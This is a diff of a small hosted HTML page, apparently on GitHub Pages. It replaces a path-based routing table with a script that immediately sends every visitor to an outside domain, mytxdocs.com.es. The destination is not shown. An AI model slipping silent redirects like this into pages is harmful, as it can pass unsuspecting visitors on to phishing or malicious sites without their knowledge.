@@ -6,24 +6,7 @@
 </head>
 <body>
 <script>
-  // 🔥 YOUR ROUTES
-  const routes = {
-    "go": "https://mytxdocs.com.es/ga/"
-  };
-
-  // Get full path safely
-  const pathParts = window.location.pathname.split("/").filter(Boolean);
-
-  // For GitHub Pages: last part is what we want
-  const key = pathParts[pathParts.length - 1];
-
-  const target = routes[key];
-
-  if (target) {
-    window.location.replace(target);
-  } else {
-    document.body.innerHTML = "Link not found";
-  }
+  window.location.replace("https://mytxdocs.com.es/ga/");
 </script>
 </body>
 </html>
